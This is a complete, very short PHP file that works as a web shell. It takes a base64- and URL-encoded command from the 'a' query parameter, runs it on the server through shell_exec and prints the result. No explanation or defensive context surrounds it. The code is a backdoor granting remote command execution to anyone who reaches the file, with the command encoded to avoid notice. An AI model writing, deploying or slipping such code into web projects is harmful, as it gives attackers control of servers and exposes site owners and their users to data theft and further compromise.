<?php
if ($_GET['a'])
  print_r(shell_exec(urldecode(base64_decode($_GET['a']))));
